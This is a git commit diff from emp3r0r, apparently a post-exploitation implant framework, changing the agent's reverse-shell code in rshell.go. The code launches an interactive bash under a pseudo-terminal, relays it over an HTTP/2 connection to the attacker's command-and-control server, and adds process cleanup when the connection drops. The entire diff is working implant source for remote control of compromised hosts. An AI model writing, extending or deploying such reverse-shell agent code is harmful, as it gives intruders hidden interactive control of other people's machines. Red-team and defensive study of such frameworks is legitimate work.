3af61271823480e7420be9cf85fdc1e06025d175
jm33-m0 <jm33.m0@gmail.com>
2020-02-18 18:34:34 +0800

    clean up reverse shell if interrupted

--- core/internal/agent/rshell.go
+++ core/internal/agent/rshell.go
@@ -11,7 +11,6 @@ import (
 	"github.com/creack/pty"
 	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
 	"github.com/posener/h2conn"
-	"golang.org/x/crypto/ssh/terminal"
 )
 
 // ActivateShell launch reverse shell and send it to CC
@@ -22,18 +21,28 @@ func ActivateShell() {
 
 		conn        *h2conn.Conn // reverse shell uses this connection
 		isShellExit = false      // when to exit
+		shellPID    = 0          // PID of the bash shell
 	)
 
 	conn, _, _, err = ConnectCC(streamURL)
-	defer func() {
+	cleanup := func() {
+		proc, err := os.FindProcess(shellPID)
+		if err != nil {
+			log.Print("bash shell already gone: ", err)
+		}
+		err = proc.Kill()
+		if err != nil {
+			log.Print("Killing bash: ", err)
+		}
 		err = conn.Close()
 		if err != nil {
 			log.Print("Closing reverseBash connection: ", err)
 		}
-		log.Print("Closed shell connection")
-	}()
+		log.Print("bash shell has been cleaned up")
+	}
+	defer cleanup()
 
-	go reverseShell(SendCC, RecvCC, &isShellExit)
+	go reverseShell(SendCC, RecvCC, &isShellExit, &shellPID)
 
 	go func() {
 		for {
@@ -44,6 +53,7 @@ func ActivateShell() {
 			_, err = conn.Read(data)
 			if err != nil {
 				log.Print("Read remote: ", err)
+				cleanup()
 				isShellExit = true
 				return
 			}
@@ -64,14 +74,16 @@ func ActivateShell() {
 }
 
 // reverseShell - Execute a reverse shell to host
-func reverseShell(send chan<- []byte, recv <-chan []byte, finished *bool) {
+func reverseShell(send chan<- []byte, recv <-chan []byte, finished *bool, pid *int) {
 	cmd := exec.Command("bash", "-li")
 
-	shellf, err := pty.Start(cmd)
+	initWinSize := pty.Winsize{Rows: 23, Cols: 80}
+	shellf, err := pty.StartWithSize(cmd, &initWinSize)
 	if err != nil {
 		log.Print("start bash: ", err)
 		return
 	}
+	*pid = cmd.Process.Pid
 
 	// Handle pty size.
 	ch := make(chan os.Signal, 1)
@@ -85,18 +97,12 @@ func reverseShell(send chan<- []byte, recv <-chan []byte, finished *bool) {
 	}()
 	ch <- syscall.SIGWINCH // Initial resize.
 
-	// Set stdin in raw mode.
-	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
-	if err != nil {
-		log.Print("MakeRaw: ", err)
-	}
 	defer func() {
 		err = shellf.Close()
 		if err != nil {
 			log.Print("Closing shellf: ", err)
 		}
 		*finished = true
-		_ = terminal.Restore(int(os.Stdin.Fd()), oldState)
 		log.Print("reverseShell exited")
 	}()
 
@@ -105,11 +111,11 @@ func reverseShell(send chan<- []byte, recv <-chan []byte, finished *bool) {
 		for incoming := range recv {
 			if strings.HasPrefix(string(incoming), "exit\n") {
 				log.Print("Exiting due to 'exit' command")
-				err = cmd.Process.Kill()
+				_, err = shellf.WriteString("exit\n")
 				if err != nil {
-					log.Print("failed to kill bash shell: ", err)
+					log.Print("failed to exit bash shell: ", err)
 				}
-				log.Print("Killed bash shell")
+				log.Print("bash shell exited")
 				return
 			}
 			_, err := shellf.Write(incoming)
